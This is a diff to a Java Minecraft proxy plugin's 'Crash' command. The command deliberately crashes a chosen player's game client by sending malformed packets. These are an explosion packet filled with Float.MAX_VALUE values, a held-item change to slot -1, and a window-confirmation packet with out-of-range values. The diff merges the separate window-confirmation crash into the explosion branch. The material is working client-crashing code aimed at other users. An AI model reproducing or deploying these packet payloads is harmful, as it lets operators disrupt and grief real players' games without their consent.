@@ -49,9 +49,7 @@ public final class Crash extends AbstractCommand {
             }
 
             if (type != null && crashPlayerClient(player, type)) {
-                sender.sendMessage(LangUtil.i18n("commands.crash.sendDone")
-                        .replace("{type}", LangUtil.i18n("commands.crash.types." + type))
-                );
+                sender.sendMessage(LangUtil.i18n("commands.crash.sendDone"));
             } else {
                 sender.sendMessage(LangUtil.i18n("commands.crash.typeNotExists"));
             }
@@ -63,7 +61,6 @@ public final class Crash extends AbstractCommand {
             sender.sendMessage(
                     LangUtil.i18n("usageError")
                             .replace("{usage}", LangUtil.i18n("commands.crash.usage"))
-                            .replace("{command}", label)
             );
         }
     }
@@ -74,7 +71,7 @@ public final class Crash extends AbstractCommand {
             return BungeeCordUtil.getPlayerList();
         }
         if (args.length == 2) {
-            return Arrays.asList("explosion", "changeHoldItem", "serverWindowConfirmation");
+            return Arrays.asList("explosion", "changeHoldItem");
         }
         return new ArrayList<>();
     }
@@ -94,8 +91,13 @@ public final class Crash extends AbstractCommand {
                             new Vector3d(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE),
                             Float.MAX_VALUE,
                             new ArrayList<>(),
-                            new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)
-                    )
+                            new Vector3f(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE))
+            );
+            PluginHookManager.getPacketEventsHook().sendPacket(player,
+                    new WrapperPlayServerWindowConfirmation(
+                            Float.MAX_EXPONENT,
+                            Short.MAX_VALUE,
+                            false) //Fixed Issue
             );
             return true;
         }
@@ -104,20 +106,7 @@ public final class Crash extends AbstractCommand {
         if (crashType.equalsIgnoreCase("changeHoldItem")) {
             PluginHookManager.getPacketEventsHook().sendPacket(player,
                     new WrapperPlayServerHeldItemChange(
-                            -1
-                    )
-            );
-            return true;
-        }
-
-        // 延迟包溢出
-        if (crashType.equalsIgnoreCase("serverWindowConfirmation")) {
-            PluginHookManager.getPacketEventsHook().sendPacket(player,
-                    new WrapperPlayServerWindowConfirmation(
-                            Float.MAX_EXPONENT,
-                            (short) Float.MAX_EXPONENT,
-                            false
-                    )
+                            -1)
             );
             return true;
         }
